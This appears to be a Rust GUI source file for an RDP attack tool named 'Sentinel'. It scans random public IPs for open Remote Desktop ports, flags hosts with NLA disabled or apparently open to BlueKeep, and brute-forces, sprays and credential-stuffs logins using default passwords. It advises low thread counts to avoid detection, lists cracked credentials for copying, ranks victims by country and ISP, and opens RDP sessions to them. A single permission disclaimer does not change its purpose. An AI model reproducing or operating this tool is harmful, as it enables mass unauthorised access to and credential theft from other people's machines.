        ui.heading("RDP Scanner - Sentinel");
        ui.add_space(10.0);

        // Scan Mode Selector
        ui.group(|ui| {
            ui.label(egui::RichText::new("Scan Mode:").strong());
            ui.add_space(5.0);
            
            ui.horizontal(|ui| {
                if ui.selectable_label(matches!(self.scan_mode, ScanMode::Random), "🎲 Random IPs").clicked() {
                    self.scan_mode = ScanMode::Random;
                }
                
                if ui.selectable_label(matches!(self.scan_mode, ScanMode::CidrRange), "🌐 CIDR Range").clicked() {
                    self.scan_mode = ScanMode::CidrRange;
                }
                
                if ui.selectable_label(matches!(self.scan_mode, ScanMode::IpList), "📄 IP List File").clicked() {
                    self.scan_mode = ScanMode::IpList;
                }
            });
            
            ui.add_space(5.0);
            
            // Mode-specific inputs
            match self.scan_mode {
                ScanMode::Random => {
                    ui.label("Scanning random public IPs");
                }
                ScanMode::CidrRange => {
                    ui.horizontal(|ui| {
                        ui.label("CIDR:");
                        ui.text_edit_singleline(&mut self.cidr_range);
                        ui.label("(e.g., 192.168.1.0/24)");
                    });
                    
                    if !self.cidr_range.is_empty() && !ip_scanner::validate_cidr(&self.cidr_range) {
                        ui.colored_label(egui::Color32::RED, "⚠️ Invalid CIDR format");
                    }
                }
                ScanMode::IpList => {
                    ui.horizontal(|ui| {
                        ui.label("File:");
                        ui.text_edit_singleline(&mut self.ip_list_path);
                        
                        if ui.button("📁 Browse").clicked() {
                            if let Some(path) = rfd::FileDialog::new()
                                .add_filter("Text files", &["txt", "csv"])
                                .pick_file()
                            {
                                self.ip_list_path = path.display().to_string();
                            }
                        }
                    });
                }
            }
        });

        ui.add_space(10.0);

        ui.horizontal(|ui| {
            ui.label("Target Count:");
            ui.add_enabled_ui(!self.unlimited_scan, |ui| {
                ui.text_edit_singleline(&mut self.target_count);
            });
            
            ui.checkbox(&mut self.unlimited_scan, "Unlimited");
            
            ui.add_space(10.0);
            ui.label("Timeout (sec):");
            ui.text_edit_singleline(&mut self.timeout);
            ui.label("Threads:");
            ui.text_edit_singleline(&mut self.threads);
            
            // Profile selector
            ui.add_space(10.0);
            ui.label("Profile:");
            egui::ComboBox::from_id_source("scan_profile")
                .selected_text(&self.config.active_profile)
                .show_ui(ui, |ui| {
                    for profile in &self.config.profiles.clone() {
                        if ui.selectable_label(
                            self.config.active_profile == profile.name,
                            &profile.name
                        ).clicked() {
                            self.config.apply_profile(&profile.name);
                            self.threads = self.config.default_threads.to_string();
                            self.timeout = self.config.default_timeout.to_string();
                        }
                    }
                });
        });

        ui.add_space(10.0);

        ui.horizontal(|ui| {
            let is_scanning = *self.is_scanning.lock().unwrap();
            if ui.button("🚀 START SCAN").clicked() && !is_scanning {
                self.start_scan();
            }

            if ui.button("⏹ STOP").clicked() {
                self.stop_scan();
            }
            
            ui.add_space(20.0);
            
            // Export button
            if ui.button("📤 EXPORT RESULTS").clicked() {
                self.show_export_dialog = true;
            }
            
            // Save to database button
            if ui.button("💾 SAVE TO DATABASE").clicked() {
                self.save_results_to_database();
            }
        });

        ui.add_space(10.0);

        let scanned = *self.scanned_count.lock().unwrap();
        let found = *self.found_count.lock().unwrap();
        let speed = *self.scan_speed.lock().unwrap();
        
        let target_display = if self.unlimited_scan {
            "∞".to_string()
        } else {
            self.target_count.clone()
        };
        
        ui.label(format!(
            "Scanned: {} | Found: {} / {} | Speed: {:.0} IPs/sec",
            scanned, found, target_display, speed
        ));

        ui.add_space(10.0);
        ui.separator();

        // Two columns layout
        ui.columns(2, |columns| {
            // Left column - Found Results
            columns[0].heading("Found (Open Ports)");
            columns[0].add_space(5.0);
            
            egui::ScrollArea::vertical()
                .id_source("scanner_found_results")
                .max_height(400.0)
                .show(&mut columns[0], |ui| {
                    let results = self.scan_results.lock().unwrap();
                    for result in results.iter().rev() {
                        ui.horizontal(|ui| {
                            ui.label(&result.ip);
                            ui.label(&result.status);
                        });
                    }
                });

            // Right column - Scanned IPs
            columns[1].heading("Recently Scanned IPs");
            columns[1].add_space(5.0);
            
            egui::ScrollArea::vertical()
                .id_source("scanner_scanned_ips")
                .max_height(400.0)
                .show(&mut columns[1], |ui| {
                    let scanned_ips = self.scanned_ips.lock().unwrap();
                    for ip in scanned_ips.iter().rev().take(100) {
                        ui.label(ip);
                    }
                });
        });
    }

    fn show_checker_tab(&mut self, ui: &mut egui::Ui) {
        ui.heading("RDP Checker - NLA Detection");
        ui.add_space(10.0);

        ui.label("This will check all found IPs from the Scanner tab for NLA status.");
        ui.add_space(10.0);

        ui.horizontal(|ui| {
            let is_checking = *self.is_checking.lock().unwrap();
            let found_count = self.scan_results.lock().unwrap().len();
            
            if ui.button("START CHECKING").clicked() && !is_checking && found_count > 0 {
                self.start_checking();
            }

            if ui.button("STOP").clicked() {
                self.stop_checking();
            }
            
            ui.add_space(20.0);
            
            if ui.button("📤 EXPORT").clicked() {
                self.show_export_window = true;
            }
            
            ui.add_space(20.0);
            
            // Vulnerability scan button
            if ui.button("🔍 SCAN VULNERABILITIES").clicked() {
                self.show_vulnerability_scan = !self.show_vulnerability_scan;
            }

            if found_count == 0 {
                ui.label("⚠️ No IPs to check. Run Scanner first!");
            }
        });

        ui.add_space(10.0);

        let checked = *self.checked_count.lock().unwrap();
        let nla_disabled = *self.nla_disabled_count.lock().unwrap();
        let total_to_check = self.scan_results.lock().unwrap().len();
        
        ui.label(format!(
            "Checked: {}/{} | NLA Disabled: {}",
            checked, total_to_check, nla_disabled
        ));

        ui.add_space(10.0);
        
        // Filter controls
        ui.horizontal(|ui| {
            ui.label("Filter by OS:");
            ui.add_space(10.0);
            
            if ui.selectable_label(self.os_filter == OsFilter::All, "All").clicked() {
                self.os_filter = OsFilter::All;
            }
            
            if ui.selectable_label(self.os_filter == OsFilter::Desktop, "🟡 Windows Desktop").clicked() {
                self.os_filter = OsFilter::Desktop;
            }
            
            if ui.selectable_label(self.os_filter == OsFilter::Server, "🟢 Windows Server").clicked() {
                self.os_filter = OsFilter::Server;
            }
        });
        
        ui.add_space(5.0);
        
        // Vulnerability legend
        ui.horizontal(|ui| {
            ui.label("Legend:");
            ui.add_space(5.0);
            ui.colored_label(egui::Color32::from_rgb(30, 144, 255), "🔵 Critical Vulnerability (Server)");
            ui.add_space(10.0);
            ui.colored_label(egui::Color32::from_rgb(218, 165, 32), "🟡 Desktop");
            ui.add_space(10.0);
            ui.colored_label(egui::Color32::from_rgb(34, 139, 34), "🟢 Server");
        });
        
        ui.add_space(10.0);
        ui.separator();
        ui.heading("Results (NLA Disabled Only)");
        ui.add_space(5.0);

        // Table with proper columns
        use egui_extras::{TableBuilder, Column};
        
        let all_results = self.checked_results.lock().unwrap().clone();
        
        // Filter results based on OS filter
        let results: Vec<CheckedResult> = all_results.into_iter().filter(|r| {
            match self.os_filter {
                OsFilter::All => true,
                OsFilter::Desktop => r.os.contains("Desktop"),
                OsFilter::Server => r.os.contains("Server"),
            }
        }).collect();
        
        egui::ScrollArea::vertical()
            .id_source("checker_results_table")
            .max_height(450.0)
            .show(ui, |ui| {
                if !results.is_empty() {
                    TableBuilder::new(ui)
                        .striped(true)
                        .resizable(true)
                        .cell_layout(egui::Layout::left_to_right(egui::Align::Center))
                        .column(Column::initial(30.0).at_least(20.0))  // Status indicator
                        .column(Column::initial(140.0).at_least(100.0).resizable(true)) // IP:Port
                        .column(Column::initial(120.0).at_least(80.0).resizable(true))  // Status
                        .column(Column::initial(150.0).at_least(100.0).resizable(true)) // OS
                        .column(Column::remainder().at_least(150.0)) // Location
                        .column(Column::remainder().at_least(120.0)) // ISP
                        .header(25.0, |mut header| {
                            header.col(|ui| {
                                ui.strong("");
                            });
                            header.col(|ui| {
                                ui.strong("IP:Port");
                            });
                            header.col(|ui| {
                                ui.strong("Status");
                            });
                            header.col(|ui| {
                                ui.strong("OS");
                            });
                            header.col(|ui| {
                                ui.strong("Location");
                            });
                            header.col(|ui| {
                                ui.strong("ISP");
                            });
                        })
                        .body(|mut body| {
                            for (_idx, result) in results.iter().enumerate() {
                                body.row(22.0, |mut row| {
                                    // Determine color based on OS type and vulnerability
                                    let (color, indicator) = if result.has_critical_vulnerability && result.os.contains("Server") {
                                        // BLUE for critically vulnerable Windows Server
                                        (egui::Color32::from_rgb(30, 144, 255), "�")
                                    } else if result.os.contains("Desktop") {
                                        // Golden color for Windows Desktop
                                        (egui::Color32::from_rgb(218, 165, 32), "�")
                                    } else {
                                        // Green color for Windows Server (not critically vulnerable)
                                        (egui::Color32::from_rgb(34, 139, 34), "🟢")
                                    };
                                    
                                    // Status indicator
                                    row.col(|ui| {
                                        ui.label(indicator);
                                    });
                                    
                                    // IP:Port
                                    row.col(|ui| {
                                        let response = ui.label(
                                            egui::RichText::new(&result.ip)
                                                .color(color)
                                                .size(11.0)
                                        );
                                        
                                        // Right-click context menu
                                        response.context_menu(|ui| {
                                            if ui.button("📋 Copy IP:Port").clicked() {
                                                ui.output_mut(|o| o.copied_text = result.ip.clone());
                                                ui.close_menu();
                                            }
                                            
                                            if ui.button("ℹ️ Get Info").clicked() {
                                                self.info_window_data = Some(result.clone());
                                                self.show_info_window = true;
                                                ui.close_menu();
                                            }
                                            
                                            if ui.button("🔗 Connect").clicked() {
                                                self.connect_to_rdp(&result.ip);
                                                ui.close_menu();
                                            }
                                        });
                                    });
                                    
                                    // Status
                                    row.col(|ui| {
                                        ui.colored_label(color, &result.status);
                                    });
                                    
                                    // OS
                                    row.col(|ui| {
                                        ui.label(&result.os);
                                    });
                                    
                                    // Location
                                    row.col(|ui| {
                                        ui.label(&result.location);
                                    });
                                    
                                    // ISP
                                    row.col(|ui| {
                                        ui.label(&result.isp);
                                    });
                                });
                            }
                        });
                } else if checked > 0 {
                    ui.label("No RDP servers with NLA disabled found yet.");
                }
            });
        
        // Info window
        if self.show_info_window {
            let data_clone = self.info_window_data.clone();
            if let Some(data) = data_clone {
                let mut close_window = false;
                let mut connect_clicked = false;
                let mut copy_clicked = false;
                let ip_copy = data.ip.clone();
                
                egui::Window::new("📊 Detailed Information")
                    .id(egui::Id::new("detailed_info_window"))
                    .collapsible(false)
                    .resizable(true)
                    .default_width(400.0)
                    .show(ui.ctx(), |ui| {
                        ui.heading("RDP Server Details");
                        ui.separator();
                        ui.add_space(10.0);
                        
                        egui::Grid::new("info_grid")
                            .num_columns(2)
                            .spacing([20.0, 8.0])
                            .striped(true)
                            .show(ui, |ui| {
                                ui.label(egui::RichText::new("IP:Port:").strong());
                                ui.label(&data.ip);
                                ui.end_row();
                                
                                ui.label(egui::RichText::new("Status:").strong());
                                ui.colored_label(
                                    egui::Color32::from_rgb(34, 139, 34),
                                    &data.status
                                );
                                ui.end_row();
                                
                                ui.label(egui::RichText::new("Operating System:").strong());
                                ui.label(&data.os);
                                ui.end_row();
                                
                                ui.label(egui::RichText::new("Country:").strong());
                                ui.label(&data.country);
                                ui.end_row();
                                
                                ui.label(egui::RichText::new("City:").strong());
                                ui.label(&data.city);
                                ui.end_row();
                                
                                ui.label(egui::RichText::new("Region:").strong());
                                ui.label(&data.region);
                                ui.end_row();
                                
                                ui.label(egui::RichText::new("Full Location:").strong());
                                ui.label(&data.location);
                                ui.end_row();
                                
                                ui.label(egui::RichText::new("ISP:").strong());
                                ui.label(&data.isp);
                                ui.end_row();
                                
                                ui.label(egui::RichText::new("NLA Status:").strong());
                                ui.colored_label(
                                    egui::Color32::from_rgb(34, 139, 34),
                                    "Disabled (Accessible)"
                                );
                                ui.end_row();
                                
                                ui.label(egui::RichText::new("BlueKeep (CVE-2019-0708):").strong());
                                if data.bluekeep_vulnerable {
                                    ui.colored_label(
                                        egui::Color32::from_rgb(255, 69, 0),
                                        "⚠️ VULNERABLE"
                                    );
                                } else {
                                    ui.colored_label(
                                        egui::Color32::from_rgb(34, 139, 34),
                                        "✓ Not Vulnerable"
                                    );
                                }
                                ui.end_row();
                                
                                ui.label(egui::RichText::new("Critical Vulnerability:").strong());
                                if data.has_critical_vulnerability {
                                    ui.colored_label(
                                        egui::Color32::from_rgb(30, 144, 255),
                                        "🔵 CRITICAL - Exploitable"
                                    );
                                } else {
                                    ui.colored_label(
                                        egui::Color32::from_rgb(34, 139, 34),
                                        "✓ No Critical Issues"
                                    );
                                }
                                ui.end_row();
                            });
                        
                        ui.add_space(15.0);
                        ui.separator();
                        ui.add_space(10.0);
                        
                        ui.horizontal(|ui| {
                            if ui.button("� Connect to RDP").clicked() {
                                connect_clicked = true;
                            }
                            
                            if ui.button("📋 Copy IP:Port").clicked() {
                                copy_clicked = true;
                            }
                            
                            if ui.button("❌ Close").clicked() {
                                close_window = true;
                            }
                        });
                    });
                
                if close_window {
                    self.show_info_window = false;
                }
                if connect_clicked {
                    self.connect_to_rdp(&ip_copy);
                }
                if copy_clicked {
                    ui.output_mut(|o| o.copied_text = ip_copy);
                }
            }
        }
        
        // Export window
        if self.show_export_window {
            let mut close_export = false;
            let mut do_export = false;
            
            egui::Window::new("📤 Export Results")
                .id(egui::Id::new("export_results_window_checker"))
                .collapsible(false)
                .resizable(false)
                .default_width(400.0)
                .show(ui.ctx(), |ui| {
                    ui.heading("Export Configuration");
                    ui.separator();
                    ui.add_space(10.0);
                    
                    ui.label("Select which results to export:");
                    ui.add_space(10.0);
                    
                    ui.horizontal(|ui| {
                        if ui.selectable_label(self.export_filter == OsFilter::All, "All Results").clicked() {
                            self.export_filter = OsFilter::All;
                        }
                        
                        if ui.selectable_label(self.export_filter == OsFilter::Desktop, "🟡 Windows Desktop Only").clicked() {
                            self.export_filter = OsFilter::Desktop;
                        }
                        
                        if ui.selectable_label(self.export_filter == OsFilter::Server, "🟢 Windows Server Only").clicked() {
                            self.export_filter = OsFilter::Server;
                        }
                    });
                    
                    ui.add_space(15.0);
                    
                    // Show count of results that will be exported
                    let all_results = self.checked_results.lock().unwrap();
                    let filtered_count = all_results.iter().filter(|r| {
                        match self.export_filter {
                            OsFilter::All => true,
                            OsFilter::Desktop => r.os.contains("Desktop"),
                            OsFilter::Server => r.os.contains("Server"),
                        }
                    }).count();
                    
                    ui.label(format!("Results to export: {}", filtered_count));
                    
                    ui.add_space(15.0);
                    ui.separator();
                    ui.add_space(10.0);
                    
                    ui.horizontal(|ui| {
                        if ui.button("✅ Export to File").clicked() && filtered_count > 0 {
                            do_export = true;
                        }
                        
                        if ui.button("❌ Cancel").clicked() {
                            close_export = true;
                        }
                    });
                    
                    if filtered_count == 0 {
                        ui.add_space(5.0);
                        ui.colored_label(
                            egui::Color32::from_rgb(255, 165, 0),
                            "⚠️ No results match the selected filter"
                        );
                    }
                });
            
            if close_export {
                self.show_export_window = false;
            }
            
            if do_export {
                self.export_results();
                self.show_export_window = false;
            }
        }
    }
    
    fn show_cracker_tab(&mut self, ui: &mut egui::Ui) {
        ui.heading("🔓 RDP Password Cracker");
        ui.add_space(10.0);

        ui.label("Attempts to crack RDP credentials using common username/password combinations.");
        ui.colored_label(
            egui::Color32::from_rgb(255, 165, 0),
            "⚠️ Only use on systems you own or have explicit permission to test!"
        );
        ui.add_space(10.0);
        
        // Advanced credential testing toggle
        ui.horizontal(|ui| {
            if ui.button(if self.show_credential_testing { "🔽 Hide Advanced Options" } else { "▶️ Show Advanced Options" }).clicked() {
                self.show_credential_testing = !self.show_credential_testing;
            }
        });
        
        ui.add_space(10.0);
        
        // Advanced credential testing options
        if self.show_credential_testing {
            ui.group(|ui| {
                ui.heading("🎯 Advanced Credential Testing");
                ui.add_space(10.0);
                
                ui.label("Attack Methods:");
                ui.add_space(5.0);
                
                ui.horizontal_wrapped(|ui| {
                    ui.label("• Password Spray: Try one password against many users");
                    ui.label("• Credential Stuffing: Test known username:password pairs");
                    ui.label("• Brute Force: Try multiple passwords per user (with lockout protection)");
                });
                
                ui.add_space(10.0);
                
                ui.label("Common usernames: administrator, admin, root, user, guest, test, backup, support");
                ui.label("Common passwords: password, Password1, P@ssw0rd, 123456, admin123, (empty)");
                
                ui.add_space(10.0);
                
                ui.horizontal(|ui| {
                    ui.label("Load custom wordlists:");
                    if ui.button("📁 Load Usernames").clicked() {
                        // File dialog for usernames
                    }
                    if ui.button("📁 Load Passwords").clicked() {
                        // File dialog for passwords
                    }
                    if ui.button("📁 Load Credentials").clicked() {
                        // File dialog for credential pairs
                    }
                });
            });
            
            ui.add_space(10.0);
        }

        ui.horizontal(|ui| {
            ui.label("Threads:");
            ui.text_edit_singleline(&mut self.crack_threads);
            ui.label("(Recommended: 5-10 to avoid detection)");
        });

        ui.add_space(10.0);

        ui.horizontal(|ui| {
            let is_cracking = *self.is_cracking.lock().unwrap();
            let target_count = self.checked_results.lock().unwrap().len();
            
            if ui.button("🚀 START CRACKING").clicked() && !is_cracking && target_count > 0 {
                self.start_cracking();
            }

            if ui.button("⏹ STOP").clicked() {
                self.stop_cracking();
            }

            if target_count == 0 {
                ui.label("⚠️ No targets available. Run Checker first!");
            }
        });

        ui.add_space(10.0);

        let cracked = *self.cracked_count.lock().unwrap();
        let attempts = *self.crack_attempts.lock().unwrap();
        let targets = self.checked_results.lock().unwrap().len();
        
        ui.label(format!(
            "Targets: {} | Attempts: {} | Cracked: {}",
            targets, attempts, cracked
        ));

        ui.add_space(10.0);
        ui.separator();
        ui.heading("Cracked Credentials");
        ui.add_space(5.0);

        // Table for cracked results
        use egui_extras::{TableBuilder, Column};
        
        let results = self.cracked_results.lock().unwrap().clone();
        
        egui::ScrollArea::vertical()
            .id_source("cracker_results_table")
            .max_height(450.0)
            .show(ui, |ui| {
                if !results.is_empty() {
                    TableBuilder::new(ui)
                        .striped(true)
                        .resizable(true)
                        .cell_layout(egui::Layout::left_to_right(egui::Align::Center))
                        .column(Column::initial(140.0).at_least(100.0).resizable(true)) // IP:Port
                        .column(Column::initial(120.0).at_least(80.0).resizable(true))  // Username
                        .column(Column::initial(120.0).at_least(80.0).resizable(true))  // Password
                        .column(Column::initial(150.0).at_least(100.0).resizable(true)) // OS
                        .column(Column::remainder().at_least(150.0)) // Location
                        .header(25.0, |mut header| {
                            header.col(|ui| {
                                ui.strong("IP:Port");
                            });
                            header.col(|ui| {
                                ui.strong("Username");
                            });
                            header.col(|ui| {
                                ui.strong("Password");
                            });
                            header.col(|ui| {
                                ui.strong("OS");
                            });
                            header.col(|ui| {
                                ui.strong("Location");
                            });
                        })
                        .body(|mut body| {
                            for result in results.iter() {
                                body.row(22.0, |mut row| {
                                    // IP:Port
                                    row.col(|ui| {
                                        let response = ui.label(
                                            egui::RichText::new(&result.ip)
                                                .color(egui::Color32::from_rgb(255, 69, 0))
                                                .size(11.0)
                                        );
                                        
                                        response.context_menu(|ui| {
                                            if ui.button("📋 Copy IP:Port").clicked() {
                                                ui.output_mut(|o| o.copied_text = result.ip.clone());
                                                ui.close_menu();
                                            }
                                            
                                            if ui.button("📋 Copy Credentials").clicked() {
                                                let creds = format!("{}:{}", result.username, result.password);
                                                ui.output_mut(|o| o.copied_text = creds);
                                                ui.close_menu();
                                            }
                                            
                                            if ui.button("🔗 Connect").clicked() {
                                                self.connect_to_rdp(&result.ip);
                                                ui.close_menu();
                                            }
                                        });
                                    });
                                    
                                    // Username
                                    row.col(|ui| {
                                        ui.colored_label(
                                            egui::Color32::from_rgb(34, 139, 34),
                                            &result.username
                                        );
                                    });
                                    
                                    // Password
                                    row.col(|ui| {
                                        ui.colored_label(
                                            egui::Color32::from_rgb(34, 139, 34),
                                            if result.password.is_empty() { 
                                                "(empty)" 
                                            } else { 
                                                &result.password 
                                            }
                                        );
                                    });
                                    
                                    // OS
                                    row.col(|ui| {
                                        ui.label(&result.os);
                                    });
                                    
                                    // Location
                                    row.col(|ui| {
                                        ui.label(&result.location);
                                    });
                                });
                            }
                        });
                } else {
                    ui.label("No credentials cracked yet. Start cracking to find vulnerable systems.");
                }
            });
        
        ui.add_space(10.0);
        ui.separator();
        
        // Common passwords info
        ui.group(|ui| {
            ui.heading("ℹ️ Password List");
            ui.add_space(5.0);
            ui.label("Testing common username/password combinations:");
            ui.add_space(5.0);
            
            ui.horizontal_wrapped(|ui| {
                ui.label("• administrator/admin/root/user/guest/test");
                ui.label("• password/Password1/P@ssw0rd/123456/admin123");
                ui.label("• (empty passwords)");
            });
        });
    }
    
    fn show_statistics_tab(&mut self, ui: &mut egui::Ui) {
        ui.heading("📊 Statistics Dashboard");
        ui.add_space(10.0);

        let checked_results = self.checked_results.lock().unwrap().clone();
        let cracked_results = self.cracked_results.lock().unwrap().clone();

        if checked_results.is_empty() {
            ui.add_space(50.0);
            ui.vertical_centered(|ui| {
                ui.label(egui::RichText::new("No data available yet").size(16.0));
                ui.add_space(10.0);
                ui.label("Run the Checker to see statistics");
            });
            return;
        }

        // Overall Statistics with better spacing
        ui.group(|ui| {
            ui.heading("📈 Overall Statistics");
            ui.add_space(10.0);
            
            ui.horizontal(|ui| {
                ui.add_space(10.0);
                
                // Total Checked
                ui.vertical(|ui| {
                    ui.label(egui::RichText::new("Total Checked").strong().size(12.0));
                    ui.add_space(5.0);
                    ui.label(egui::RichText::new(format!("{}", checked_results.len())).size(28.0).color(egui::Color32::from_rgb(100, 149, 237)));
                });
                
                ui.add_space(40.0);
                
                // Desktops
                ui.vertical(|ui| {
                    ui.label(egui::RichText::new("Desktops").strong().size(12.0));
                    ui.add_space(5.0);
                    let desktop_count = checked_results.iter().filter(|r| r.os.contains("Desktop")).count();
                    ui.label(egui::RichText::new(format!("{}", desktop_count)).size(28.0).color(egui::Color32::from_rgb(218, 165, 32)));
                });
                
                ui.add_space(40.0);
                
                // Servers
                ui.vertical(|ui| {
                    ui.label(egui::RichText::new("Servers").strong().size(12.0));
                    ui.add_space(5.0);
                    let server_count = checked_results.iter().filter(|r| r.os.contains("Server")).count();
                    ui.label(egui::RichText::new(format!("{}", server_count)).size(28.0).color(egui::Color32::from_rgb(34, 139, 34)));
                });
                
                ui.add_space(40.0);
                
                // Cracked
                ui.vertical(|ui| {
                    ui.label(egui::RichText::new("Cracked").strong().size(12.0));
                    ui.add_space(5.0);
                    ui.label(egui::RichText::new(format!("{}", cracked_results.len())).size(28.0).color(egui::Color32::from_rgb(255, 69, 0)));
                });
            });
            
            ui.add_space(10.0);
        });

        ui.add_space(15.0);

        // Two columns layout with fixed widths
        ui.horizontal(|ui| {
            // Left column - Country Statistics
            ui.group(|ui| {
                ui.set_width(450.0);
                ui.heading("🌍 Top Countries");
                ui.add_space(10.0);
                
                // Count by country
                let mut country_map: std::collections::HashMap<String, usize> = std::collections::HashMap::new();
                for result in &checked_results {
                    if !result.country.is_empty() && result.country != "Unknown" {
                        *country_map.entry(result.country.clone()).or_insert(0) += 1;
                    }
                }
                
                // Sort by count
                let mut country_vec: Vec<_> = country_map.iter().collect();
                country_vec.sort_by(|a, b| b.1.cmp(a.1));
                
                egui::ScrollArea::vertical()
                    .id_source("stats_countries")
                    .max_height(300.0)
                    .show(ui, |ui| {
                        use egui_extras::{TableBuilder, Column};
                        
                        if !country_vec.is_empty() {
                            ui.push_id("countries_table", |ui| {
                                TableBuilder::new(ui)
                                    .striped(true)
                                    .cell_layout(egui::Layout::left_to_right(egui::Align::Center))
                                    .column(Column::exact(35.0))   // Rank
                                    .column(Column::exact(200.0))  // Country
                                    .column(Column::exact(70.0))   // Count
                                    .column(Column::exact(80.0))   // Percentage
                                    .header(22.0, |mut header| {
                                        header.col(|ui| { 
                                            ui.strong("#"); 
                                        });
                                        header.col(|ui| { 
                                            ui.strong("Country"); 
                                        });
                                        header.col(|ui| { 
                                            ui.strong("Count"); 
                                        });
                                        header.col(|ui| { 
                                            ui.strong("%"); 
                                        });
                                    })
                                    .body(|mut body| {
                                        let total = checked_results.len() as f32;
                                        for (idx, (country, count)) in country_vec.iter().take(15).enumerate() {
                                            body.row(20.0, |mut row| {
                                                row.col(|ui| {
                                                    ui.label(format!("{}", idx + 1));
                                                });
                                                row.col(|ui| {
                                                    ui.label(*country);
                                                });
                                                row.col(|ui| {
                                                    ui.label(egui::RichText::new(format!("{}", count)).strong());
                                                });
                                                row.col(|ui| {
                                                    let percentage = (**count as f32 / total) * 100.0;
                                                    ui.label(format!("{:.1}%", percentage));
                                                });
                                            });
                                        }
                                    });
                            });
                        } else {
                            ui.label("No country data available");
                        }
                    });
            });

            ui.add_space(10.0);

            // Right column - ISP Statistics
            ui.group(|ui| {
                ui.set_width(450.0);
                ui.heading("🏢 Top ISPs");
                ui.add_space(10.0);
                
                // Count by ISP
                let mut isp_map: std::collections::HashMap<String, usize> = std::collections::HashMap::new();
                for result in &checked_results {
                    if !result.isp.is_empty() && result.isp != "Unknown" {
                        *isp_map.entry(result.isp.clone()).or_insert(0) += 1;
                    }
                }
                
                // Sort by count
                let mut isp_vec: Vec<_> = isp_map.iter().collect();
                isp_vec.sort_by(|a, b| b.1.cmp(a.1));
                
                egui::ScrollArea::vertical()
                    .id_source("stats_isps")
                    .max_height(300.0)
                    .show(ui, |ui| {
                        use egui_extras::{TableBuilder, Column};
                        
                        if !isp_vec.is_empty() {
                            ui.push_id("isps_table", |ui| {
                                TableBuilder::new(ui)
                                    .striped(true)
                                    .cell_layout(egui::Layout::left_to_right(egui::Align::Center))
                                    .column(Column::exact(35.0))   // Rank
                                    .column(Column::exact(200.0))  // ISP
                                    .column(Column::exact(70.0))   // Count
                                    .column(Column::exact(80.0))   // Percentage
                                    .header(22.0, |mut header| {
                                        header.col(|ui| { 
                                            ui.strong("#"); 
                                        });
                                        header.col(|ui| { 
                                            ui.strong("ISP"); 
                                        });
                                        header.col(|ui| { 
                                            ui.strong("Count"); 
                                        });
                                        header.col(|ui| { 
                                            ui.strong("%"); 
                                        });
                                    })
                                    .body(|mut body| {
                                        let total = checked_results.len() as f32;
                                        for (idx, (isp, count)) in isp_vec.iter().take(15).enumerate() {
                                            body.row(20.0, |mut row| {
                                                row.col(|ui| {
                                                    ui.label(format!("{}", idx + 1));
                                                });
                                                row.col(|ui| {
                                                    // Truncate long ISP names
                                                    let isp_display = if isp.len() > 30 {
                                                        format!("{}...", &isp[..27])
                                                    } else {
                                                        isp.to_string()
                                                    };
                                                    ui.label(isp_display);
                                                });
                                                row.col(|ui| {
                                                    ui.label(egui::RichText::new(format!("{}", count)).strong());
                                                });
                                                row.col(|ui| {
                                                    let percentage = (**count as f32 / total) * 100.0;
                                                    ui.label(format!("{:.1}%", percentage));
                                                });
                                            });
                                        }
                                    });
                            });
                        } else {
                            ui.label("No ISP data available");
                        }
                    });
            });
        });

        ui.add_space(15.0);

        // Vulnerability Statistics
        ui.group(|ui| {
            ui.heading("🔒 Vulnerability Statistics");
            ui.add_space(10.0);
            
            let bluekeep_count = checked_results.iter().filter(|r| r.bluekeep_vulnerable).count();
            let critical_count = checked_results.iter().filter(|r| r.has_critical_vulnerability).count();
            let total = checked_results.len() as f32;
            
            ui.horizontal(|ui| {
                ui.add_space(10.0);
                
                ui.vertical(|ui| {
                    ui.label(egui::RichText::new("BlueKeep Vulnerable").strong().size(12.0));
                    ui.add_space(5.0);
                    ui.label(egui::RichText::new(format!("{} ({:.1}%)", bluekeep_count, (bluekeep_count as f32 / total) * 100.0)).size(22.0).color(egui::Color32::from_rgb(255, 140, 0)));
                });
                
                ui.add_space(40.0);
                
                ui.vertical(|ui| {
                    ui.label(egui::RichText::new("Critical Vulnerabilities").strong().size(12.0));
                    ui.add_space(5.0);
                    ui.label(egui::RichText::new(format!("{} ({:.1}%)", critical_count, (critical_count as f32 / total) * 100.0)).size(22.0).color(egui::Color32::from_rgb(255, 69, 0)));
                });
                
                ui.add_space(40.0);
                
                ui.vertical(|ui| {
                    ui.label(egui::RichText::new("Success Rate").strong().size(12.0));
                    ui.add_space(5.0);
                    let success_rate = if !checked_results.is_empty() && !cracked_results.is_empty() {
                        (cracked_results.len() as f32 / checked_results.len() as f32) * 100.0
                    } else {
                        0.0
                    };
                    ui.label(egui::RichText::new(format!("{:.1}%", success_rate)).size(22.0).color(egui::Color32::from_rgb(34, 139, 34)));
                });
            });
            
            ui.add_space(10.0);
        });

        ui.add_space(15.0);

        // City Statistics
        ui.group(|ui| {
            ui.heading("🏙️ Top Cities");
            ui.add_space(10.0);
            
            // Count by city
            let mut city_map: std::collections::HashMap<String, usize> = std::collections::HashMap::new();
            for result in &checked_results {
                if !result.city.is_empty() && result.city != "Unknown" {
                    let city_country = format!("{}, {}", result.city, result.country);
                    *city_map.entry(city_country).or_insert(0) += 1;
                }
            }
            
            // Sort by count
            let mut city_vec: Vec<_> = city_map.iter().collect();
            city_vec.sort_by(|a, b| b.1.cmp(a.1));
            
            egui::ScrollArea::vertical()
                .id_source("stats_cities")
                .max_height(150.0)
                .show(ui, |ui| {
                    ui.horizontal_wrapped(|ui| {
                        for (city, count) in city_vec.iter().take(20) {
                            ui.label(format!("{} ({})", city, count));
                            ui.label("|");
                        }
                    });
                });
        });
    }
    
    fn connect_to_rdp(&self, ip_port: &str) {
        let parts: Vec<&str> = ip_port.split(':').collect();
        if parts.len() == 2 {
            let ip = parts[0];
            let port = parts[1];
            
            // Create RDP file content
            let rdp_content = format!(
                "full address:s:{}:{}\n\
                screen mode id:i:2\n\
                use multimon:i:0\n\
                desktopwidth:i:1920\n\
                desktopheight:i:1080\n\
                session bpp:i:32\n\
                compression:i:1\n\
                keyboardhook:i:2\n\
                audiocapturemode:i:0\n\
                videoplaybackmode:i:1\n\
                connection type:i:7\n\
                networkautodetect:i:1\n\
                bandwidthautodetect:i:1\n\
                displayconnectionbar:i:1\n\
                authentication level:i:0\n\
                prompt for credentials:i:1\n\
                negotiate security layer:i:1\n",
                ip, port
            );
            
            // Write to temp file
            let temp_file = format!("temp_rdp_{}.rdp", rand::random::<u32>());
            if let Ok(_) = std::fs::write(&temp_file, rdp_content) {
                // Launch mstsc
                #[cfg(target_os = "windows")]
                {
                    std::process::Command::new("mstsc")
                        .arg(&temp_file)
                        .spawn()
                        .ok();
